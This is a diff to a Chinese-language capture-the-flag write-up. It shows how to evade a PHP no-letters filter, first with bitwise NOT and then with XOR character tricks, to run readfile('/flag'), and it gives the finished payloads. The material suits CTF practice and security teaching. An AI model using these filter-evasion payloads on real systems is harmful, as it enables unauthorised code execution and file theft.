@@ -16,3 +16,30 @@ $_(~'高位字节');       // 运行时得到 "/flag"，并调用 readfile
 其他字节经URL最终得到code=%24_%3D~%27%8D%9A%9E%9B%99%96%93%9A%27%3B%24_%28~%27%D0%99%93%9E%98%27%29%3B
 通过brup发送POST请求，在响应中得到flag
 ![获取flag](https://github.com/user-attachments/assets/fe4839d7-a5c7-4d70-9a5a-4e26efe20e5b)
+
+除此之外，可以通过特定的两个字符异或得到所需的英文字符
+构造readfile
+```text
+) ^ [ = r
+% ^ @ = e
+! ^ @ = a
+$ ^ @ = d
+& ^ @ = f
+) ^ @ = i
+, ^ @ = l
+% ^ @ = e
+```
+
+构造flag
+
+```text
+& ^ @ = f
+, ^ @ = l
+! ^ @ = a
+: ^ ] = g
+```
+
+```php
+得到(')%!$&),%'^'[@@@@@@@')('/'.('&,!:'^'@@@]'));
+```
+![网页端输入获取flag](https://github.com/user-attachments/assets/f3505463-fbcd-44a0-9f97-eb307f1efaf0)
